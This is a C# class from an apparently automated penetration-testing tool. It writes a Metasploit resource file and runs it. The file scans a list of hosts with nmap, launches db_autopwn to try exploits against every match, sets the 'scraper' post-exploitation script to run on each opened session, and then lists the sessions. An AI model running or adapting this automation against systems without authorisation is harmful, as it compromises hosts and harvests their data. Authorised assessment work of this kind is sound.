using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace AutoAssess.Data.BusinessObjects
{
	public class Metasploit : ITool
	{
		MetasploitToolOptions _options;
		
		public Metasploit ()
		{
		}
		
		public Metasploit(IToolOptions options)
		{
			if (options is MetasploitToolOptions)
				_options = (MetasploitToolOptions)options;
		}
		
		public string Name { get { return "Metasploit"; }}
		public string Description { get { return string.Empty; }}
		
		public ScanLevel Level { get { return ScanLevel.Fourth; }}
		
		public IToolOptions Options 
		{ 
			get
			{
				if (_options == null)
					_options = new MetasploitToolOptions();
				
				return _options;
			}
			set
			{
				if (value is MetasploitToolOptions)
					_options = (MetasploitToolOptions)value;
			}
		}
		
		
		public IToolResults Run (Guid scanID, Guid userID)
		{
			string cmd, output;
			
			WriteResourceFile(_options.ResourceFilePath);
			
			cmd = "-r " + _options.ResourceFilePath;
			
			ProcessStartInfo si = new ProcessStartInfo();
			si.RedirectStandardOutput = true;
			si.UseShellExecute = false;
			
			Process proc = new Process();
			
			proc.StartInfo = si;
			proc.EnableRaisingEvents = false; 
			proc.StartInfo.FileName = _options.Path;
			proc.StartInfo.Arguments = cmd;
			proc.Start();
			
			output = proc.StandardOutput.ReadToEnd();
			
			proc.WaitForExit();
			
			MetasploitToolResults results = new MetasploitToolResults(output);
			
			
			Console.WriteLine(output);
			return results;
		}
		
		private void WriteResourceFile(string rcPath)
		{
			List<string> rcContents = new List<string>();
			
			rcContents.Add("db_driver " + _options.DatabaseDriver);
			rcContents.Add("db_connect \"" + _options.DatabaseUser + ":" + _options.DatabasePassword + "@" + _options.DatabaseAddress + "/" + _options.DatabaseName + "\"");
			rcContents.Add("db_workspace -a \"" + _options.ClientName + "-" + DateTime.Now.ToLongTimeString() + "\"");
			rcContents.Add("db_nmap -iL " + _options.IPListPath);
			rcContents.Add("setg AutoRunScript scraper");
			rcContents.Add("db_autopwn -t -e -p -r");
			
			if (_options.EnableNessus)
			{
				//add nessus scan code
			}
			
			rcContents.Add("sessions -l -v");
			rcContents.Add("exit");	
			
			using (FileStream s = File.Open(_options.ResourceFilePath, FileMode.OpenOrCreate))
			{
				using (StreamWriter w = new StreamWriter(s))
				{
					foreach (string line in rcContents)
					{
						w.WriteLine(line);
					}
				}
			}
		}
	}
}

